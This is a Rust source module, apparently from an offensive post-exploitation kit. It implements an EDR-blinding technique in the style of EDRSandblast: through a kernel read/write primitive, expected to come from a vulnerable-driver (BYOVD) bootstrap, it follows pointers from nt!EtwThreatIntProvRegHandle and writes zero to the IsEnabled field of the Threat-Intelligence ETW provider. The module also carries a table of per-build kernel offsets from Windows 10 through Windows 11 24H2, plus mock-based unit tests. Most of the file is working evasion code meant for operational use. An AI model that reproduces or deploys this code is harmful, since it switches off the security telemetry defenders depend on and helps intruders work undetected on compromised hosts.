//! ETW-TI (Threat Intelligence) provider kernel blind — REAL algorithm (P2.2 §2.1).
//!
//! Disables the `Microsoft-Windows-Threat-Intelligence` kernel ETW provider by
//! a single QWORD write to its `ProviderEnableInfo.IsEnabled` field, reached by
//! chasing `nt!EtwThreatIntProvRegHandle → +provider_block_off → +enableinfo_off`.
//! This is HVCI-safe: the target is a data-section field, not code, so a kernel
//! R/W primitive that refuses code-page writes (the `KernelRw` HVCI contract)
//! still permits this.
//!
//! ## Why this works against kernel-tier EDR telemetry
//! User-mode ETW blinds (Nyx P2.1b patches `ntdll!NtTraceEvent`) only stop
//! *user-mode* ETW loggers. EDRs that subscribe to the kernel ETW-TI provider
//! (`Microsoft-Windows-Threat-Intelligence`, GUID
//! `{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}`) get telemetry straight from the
//! kernel — `NtReadVirtualMemory`/`NtAllocateVirtualMemory`/`NtProtectVirtual-
//! Memory` calls are logged there *before* the user-mode patch matters.
//! Disabling the provider at its kernel registration block silences that
//! kernel-side feed at the source. This is the S12 / EDRSandblast technique.
//!
//! ## Layering / what this module is NOT
//! This is the **algorithm** given a working `&dyn KernelRw`. It does NOT load
//! a driver, resolve `EtwThreatIntProvRegHandle`, or touch the kernel directly —
//! those are the bootstrap (`KernelRw` impl + symbol resolution) in Part B /
//! the operator's chosen BYOVD path. Splitting algorithm from primitive keeps
//! the algorithm unit-testable with a mock `KernelRw` and lets any bootstrap
//! (KslD.sys / driverless CVE / DMA) drive it without editing this code.
//!
//! ## Offset versioning
//! The `GUIDEntry → provider block` and `provider block → EnableInfo` offsets
//! vary across Windows builds. [`EtwTiOffsets`] holds them; [`for_build`] picks
//! known-good values per build, and a real impl may probe at runtime. NEVER
//! hardcode a single offset across builds — it silently writes the wrong field.

use crate::{EtwTiKit, KernelRw, KitError};

/// The ETW-TI provider GUID (`Microsoft-Windows-Threat-Intelligence`).
/// Used only for diagnostics / a future self-check that the resolved handle
/// points at this provider; the blind itself chases the handle, not the GUID.
pub const ETW_TI_GUID: [u8; 16] = [
    0x7C, 0x89, 0xE1, 0xF4, 0x5D, 0xBB, 0x68, 0x56,
    0xF1, 0xD8, 0x04, 0x0F, 0x4D, 0x8D, 0xD3, 0x44,
];

/// Build-dependent offsets for the ETW-TI provider-block chase. See [`for_build`].
///
/// - `guid_entry_to_provider_block`: offset within the `GUIDEntry` struct to the
///   `ETWRT_PROVIDER_BLOCK*` pointer.
/// - `provider_block_to_enable_info`: offset within `ETWRT_PROVIDER_BLOCK` to the
///   `ProviderEnableInfo` struct, whose first DWORD is `IsEnabled`.
/// - `is_enabled_within_enable_info`: byte offset of `IsEnabled` within
///   `ProviderEnableInfo` (0 on every known build — it's the first field).
#[derive(Clone, Copy, Debug)]
pub struct EtwTiOffsets {
    pub guid_entry_to_provider_block: usize,
    pub provider_block_to_enable_info: usize,
    pub is_enabled_within_enable_info: usize,
}

impl EtwTiOffsets {
    /// Known-good offsets per Windows build + UBR (update build revision).
    /// Sourced from EDRSandblast `NtoskrnlOffsets.csv` + fluxsec.red research.
    /// Unknown builds return `None` so the caller MUST probe (writing a guessed
    /// offset to the wrong field is a one-way ticket to a bugcheck).
    ///
    /// **Critical version fork (ETW GUID entry was restructured in 17763.1075):**
    /// the `_ETW_GUID_ENTRY.ProviderEnableInfo` offset moved from `0x050`
    /// (RTM 17763.1) to `0x060` (17763.1075+). Passing the wrong one writes a
    /// garbage field → EDR keeps logging AND the kernel state is corrupted.
    /// `for_build` distinguishes via UBR when known; `for_build_strict` requires
    /// the caller to supply the exact UBR.
    pub fn for_build(build: u32) -> Option<Self> {
        match build {
            // Win10 1809–21H2 / Server 2019 (build 17763 .. 19044). For 17763
            // specifically, assume patched (UBR>=1075) — virtually every live
            // Server 2019 is. RTM (UBR=1) callers should use for_build_strict.
            17763 => Some(Self::patched_17763()),
            18362..=19044 => Some(Self {
                guid_entry_to_provider_block: 0x020,
                provider_block_to_enable_info: 0x060,
                is_enabled_within_enable_info: 0x000,
            }),
            // Server 2022 / Win11 21H2 (20348/22000): same ETW layout as 1904x.
            20348..=22000 => Some(Self {
                guid_entry_to_provider_block: 0x020,
                provider_block_to_enable_info: 0x060,
                is_enabled_within_enable_info: 0x000,
            }),
            // Win11 22H2/23H2 (22621/22631): EnableInfo shifted to 0x070.
            22621..=22631 => Some(Self {
                guid_entry_to_provider_block: 0x020,
                provider_block_to_enable_info: 0x070,
                is_enabled_within_enable_info: 0x000,
            }),
            // Win11 24H2/25H2 (26100/26200): same as 22H2 ETW layout.
            26100..=26200 => Some(Self {
                guid_entry_to_provider_block: 0x020,
                provider_block_to_enable_info: 0x070,
                is_enabled_within_enable_info: 0x000,
            }),
            // Floor match: a patch build (e.g. 19045) maps to the nearest lower.
            _ => Self::floor_match(build),
        }
    }

    /// Floor match: the highest known build <= the requested one. Handles
    /// patch builds (19045 → 19041's layout, 22635 → 22631's, etc.).
    fn floor_match(build: u32) -> Option<Self> {
        // Try each known range ceiling; return the one whose range floor <= build.
        if build >= 26100 {
            Self::for_build(26100)
        } else if build >= 22621 {
            Self::for_build(22621)
        } else if build >= 20348 {
            Self::for_build(20348)
        } else if build >= 18362 {
            Self::for_build(19041)
        } else if build >= 17763 {
            Self::for_build(17763)
        } else {
            None // below the supported range
        }
    }

    /// Strict variant: takes the exact UBR so the 17763 RTM-vs-patched fork is
    /// resolved precisely. Use this when you know the target's UBR (the only
    /// safe choice for a 17763 host).
    pub fn for_build_strict(build: u32, ubr: u32) -> Option<Self> {
        match build {
            17763 => {
                // RTM (UBR < 1075) uses 0x050; 1075+ uses 0x060.
                let enable_info = if ubr < 1075 { 0x050 } else { 0x060 };
                Some(Self {
                    guid_entry_to_provider_block: 0x020,
                    provider_block_to_enable_info: enable_info,
                    is_enabled_within_enable_info: 0x000,
                })
            }
            _ => Self::for_build(build),
        }
    }

    /// The patched-17763 layout (EnableInfo @ 0x060). Most common live value.
    fn patched_17763() -> Self {
        Self {
            guid_entry_to_provider_block: 0x020,
            provider_block_to_enable_info: 0x060,
            is_enabled_within_enable_info: 0x000,
        }
    }
}

/// The real ETW-TI blind. Holds the resolved kernel VA of
/// `nt!EtwThreatIntProvRegHandle` (a `GUIDEntry*`) + the build's offsets. The
/// bootstrap (BYOVD loader) resolves the symbol VA and constructs this; the
/// blind algorithm itself is build-agnostic given `offsets`.
pub struct EtwTiBlind {
    /// Kernel VA of `nt!EtwThreatIntProvRegHandle` — the head of the chase.
    /// Resolved by the bootstrap via `MmGetSystemRoutineAddress` (or the
    /// KernelRw impl's equivalent).
    pub prov_reg_handle_kva: usize,
    pub offsets: EtwTiOffsets,
}

/// The value written to `IsEnabled` to disable the provider (0 = disabled).
/// Kept as a named constant so a future "forge still-enabled" variant is a
/// one-line change.
const DISABLED: u64 = 0;

impl EtwTiBlind {
    /// Resolve the kernel VA of the `IsEnabled` field by chasing the handle.
    /// Pure (uses kread only) so `is_blinded` and `blind` share the exact same
    /// path — no offset drift between check and write.
    ///
    /// Returns the KVA of the IsEnabled QWORD, or an error if any pointer in
    /// the chain is NULL (provider not registered on this host — a real EDR
    /// must be subscribing for there to be anything to blind).
    fn resolve_is_enabled_kva(&self, krw: &dyn KernelRw) -> Result<usize, KitError> {
        // Step 1: prov_reg_handle → GUIDEntry. The handle is itself a pointer
        // to the GUIDEntry; dereference it.
        let guid_entry = krw.kread_u64(self.prov_reg_handle_kva).map_err(KitError::from)?;
        if guid_entry == 0 {
            return Err(KitError::UnsupportedPosture(
                "EtwThreatIntProvRegHandle is NULL — ETW-TI provider not registered",
            ));
        }
        // Step 2: GUIDEntry + off → ETWRT_PROVIDER_BLOCK*.
        let prov_block_kva = krw
            .kread_u64(guid_entry as usize + self.offsets.guid_entry_to_provider_block)
            .map_err(KitError::from)?;
        if prov_block_kva == 0 {
            return Err(KitError::UnsupportedPosture(
                "provider block pointer is NULL — EDR not subscribed to ETW-TI",
            ));
        }
        // Step 3: provider_block + off + IsEnabled offset → the QWORD to write.
        Ok(prov_block_kva as usize
            + self.offsets.provider_block_to_enable_info
            + self.offsets.is_enabled_within_enable_info)
    }
}

impl EtwTiKit for EtwTiBlind {
    /// Disable the ETW-TI provider by writing `IsEnabled = 0`. Idempotent: if
    /// already disabled, the write is a no-op (writing 0 over 0). The target is
    /// a data-section field, so HVCI-enforcing KernelRw impls permit it.
    fn blind(&self, krw: &dyn KernelRw) -> Result<(), KitError> {
        let target = self.resolve_is_enabled_kva(krw)?;
        krw.kwrite_u64(target, DISABLED).map_err(KitError::from)
    }

    /// Read back `IsEnabled`; true means the provider is currently disabled
    /// (i.e. the blind is in place). A real engagement may extend this to also
    /// forge the EnableInfo integrity bytes Sanctum/Peregrine probe.
    fn is_blinded(&self, krw: &dyn KernelRw) -> Result<bool, KitError> {
        let target = self.resolve_is_enabled_kva(krw)?;
        let val = krw.kread_u64(target).map_err(KitError::from)?;
        Ok(val == DISABLED)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::KrwError;
    use alloc::collections::BTreeMap;
    use spin::mutex::Mutex;

    /// A mock KernelRw over a Mutex-protected sparse byte map. Send+Sync (Mutex),
    /// so it satisfies the `KernelRw: Send + Sync` bound. Lets us observe the
    /// IsEnabled write without any real kernel.
    struct MockKrw(Mutex<BTreeMap<usize, u8>>);
    impl MockKrw {
        fn new() -> Self {
            Self(Mutex::new(BTreeMap::new()))
        }
        fn set_u64(&self, addr: usize, val: u64) {
            let mut m = self.0.lock();
            for (i, b) in val.to_le_bytes().iter().enumerate() {
                m.insert(addr + i, *b);
            }
        }
        fn get_u64(&self, addr: usize) -> u64 {
            let m = self.0.lock();
            let mut bytes = [0u8; 8];
            for (i, b) in bytes.iter_mut().enumerate() {
                *b = *m.get(&(addr + i)).unwrap_or(&0);
            }
            u64::from_le_bytes(bytes)
        }
    }
    impl KernelRw for MockKrw {
        fn kread(&self, kaddr: usize, dst: &mut [u8]) -> Result<(), KrwError> {
            let m = self.0.lock();
            for (i, b) in dst.iter_mut().enumerate() {
                *b = *m.get(&(kaddr + i)).unwrap_or(&0);
            }
            Ok(())
        }
        fn kwrite(&self, kaddr: usize, src: &[u8]) -> Result<(), KrwError> {
            let mut m = self.0.lock();
            for (i, b) in src.iter().enumerate() {
                m.insert(kaddr + i, *b);
            }
            Ok(())
        }
    }
    // Mutex<T> is Send+Sync when T: Send; BTreeMap<usize,u8> is Send, so MockKrw
    // satisfies KernelRw: Send + Sync. (Silence dead_code for the unused
    // Send/Sync auto-proof marker.)
    fn _assert_send_sync() {
        fn requires<T: KernelRw>(_: &T) {}
        let m = MockKrw::new();
        requires(&m);
    }

    #[test]
    fn for_build_known_and_unknown() {
        assert!(EtwTiOffsets::for_build(17763).is_some()); // Server 2019
        assert!(EtwTiOffsets::for_build(19041).is_some()); // Win10 2004
        assert!(EtwTiOffsets::for_build(22621).is_some()); // Win11 22H2 — now in table
        assert!(EtwTiOffsets::for_build(26100).is_some()); // Win11 24H2 — now in table
        assert!(EtwTiOffsets::for_build(9999).is_none()); // truly unknown build
    }

    #[test]
    fn for_build_strict_distinguishes_17763_rtm_vs_patched() {
        // RTM (UBR=1) → EnableInfo @ 0x050
        let rtm = EtwTiOffsets::for_build_strict(17763, 1).unwrap();
        assert_eq!(rtm.provider_block_to_enable_info, 0x050);
        // Patched (UBR>=1075) → EnableInfo @ 0x060
        let patched = EtwTiOffsets::for_build_strict(17763, 1339).unwrap(); // this host
        assert_eq!(patched.provider_block_to_enable_info, 0x060);
        // Boundary: UBR=1074 still RTM, 1075 flips.
        assert_eq!(EtwTiOffsets::for_build_strict(17763, 1074).unwrap().provider_block_to_enable_info, 0x050);
        assert_eq!(EtwTiOffsets::for_build_strict(17763, 1075).unwrap().provider_block_to_enable_info, 0x060);
    }

    #[test]
    fn blind_writes_zero_at_chased_offset() {
        // Lay out a fake kernel: handle → GUIDEntry → provider block → EnableInfo.
        let krw = MockKrw::new();
        let handle_kva = 0x1000;
        let guid_entry_kva = 0x2000;
        let prov_block_kva = 0x3000;
        let off = EtwTiOffsets::for_build(17763).unwrap();
        let enable_info_kva = prov_block_kva + off.provider_block_to_enable_info;
        let is_enabled_kva = enable_info_kva + off.is_enabled_within_enable_info;

        // Wire the pointer chain.
        krw.set_u64(handle_kva, guid_entry_kva as u64);
        krw.set_u64(guid_entry_kva + off.guid_entry_to_provider_block, prov_block_kva as u64);
        krw.set_u64(is_enabled_kva, 1); // provider "enabled" pre-blind

        let kit = EtwTiBlind { prov_reg_handle_kva: handle_kva, offsets: off };
        assert!(!kit.is_blinded(&krw).unwrap()); // enabled pre-blind
        kit.blind(&krw).unwrap();
        assert!(kit.is_blinded(&krw).unwrap()); // disabled post-blind
        assert_eq!(krw.get_u64(is_enabled_kva), 0); // the field itself is 0
    }

    #[test]
    fn blind_is_idempotent() {
        let krw = MockKrw::new();
        let handle_kva = 0x4000;
        let off = EtwTiOffsets::for_build(19044).unwrap();
        krw.set_u64(handle_kva, 0x5000);
        krw.set_u64(0x5000 + off.guid_entry_to_provider_block, 0x6000);
        let is_enabled = 0x6000 + off.provider_block_to_enable_info;
        krw.set_u64(is_enabled, 1);
        let kit = EtwTiBlind { prov_reg_handle_kva: handle_kva, offsets: off };
        kit.blind(&krw).unwrap();
        kit.blind(&krw).unwrap(); // second blind — must not error
        assert!(kit.is_blinded(&krw).unwrap());
    }

    #[test]
    fn null_handle_is_unsupported_posture() {
        let krw = MockKrw::new();
        let off = EtwTiOffsets::for_build(17763).unwrap();
        krw.set_u64(0x7000, 0); // handle dereferences to NULL
        let kit = EtwTiBlind { prov_reg_handle_kva: 0x7000, offsets: off };
        let r = kit.blind(&krw);
        assert!(matches!(r, Err(KitError::UnsupportedPosture(_))));
    }

    #[test]
    fn null_provider_block_is_unsupported_posture() {
        let krw = MockKrw::new();
        let off = EtwTiOffsets::for_build(17763).unwrap();
        krw.set_u64(0x8000, 0x9000); // handle → GUIDEntry
        krw.set_u64(0x9000 + off.guid_entry_to_provider_block, 0); // block ptr NULL
        let kit = EtwTiBlind { prov_reg_handle_kva: 0x8000, offsets: off };
        let r = kit.is_blinded(&krw);
        assert!(matches!(r, Err(KitError::UnsupportedPosture(_))));
    }

    #[test]
    fn hvci_code_page_error_propagates_as_no_primitive() {
        // A KernelRw that reads ok (non-null pointers) but refuses writes with
        // HvciCodePage — simulating an HVCI-on code-page refusal on the blind write.
        struct ReadOkWriteHvci;
        impl KernelRw for ReadOkWriteHvci {
            fn kread(&self, _kaddr: usize, dst: &mut [u8]) -> Result<(), KrwError> {
                if dst.len() >= 8 { dst[..8].copy_from_slice(&[0x10u8; 8]); }
                Ok(())
            }
            fn kwrite(&self, _kaddr: usize, _src: &[u8]) -> Result<(), KrwError> {
                Err(KrwError::HvciCodePage)
            }
        }
        let krw = ReadOkWriteHvci;
        let off = EtwTiOffsets::for_build(17763).unwrap();
        let kit = EtwTiBlind { prov_reg_handle_kva: 0x1000, offsets: off };
        let r = kit.blind(&krw);
        assert!(matches!(r, Err(KitError::NoPrimitive(KrwError::HvciCodePage))));
    }

    #[test]
    fn win11_22h2_now_has_known_offsets() {
        // 22H2 EnableInfo shifted to 0x070 (was None before the cross-version table).
        let o = EtwTiOffsets::for_build(22621).unwrap();
        assert_eq!(o.provider_block_to_enable_info, 0x070);
        // 24H2 same ETW layout as 22H2.
        let o2 = EtwTiOffsets::for_build(26100).unwrap();
        assert_eq!(o2.provider_block_to_enable_info, 0x070);
        // Server 2022 / Win11 21H2 still at 0x060 (pre-22H2 layout).
        let o3 = EtwTiOffsets::for_build(20348).unwrap();
        assert_eq!(o3.provider_block_to_enable_info, 0x060);
    }

    #[test]
    fn patch_build_floor_matches() {
        // 19045 (Win10 22H2 patch) floor-matches to the 19041 ETW layout.
        let o = EtwTiOffsets::for_build(19045).unwrap();
        assert_eq!(o.provider_block_to_enable_info, 0x060);
    }
}
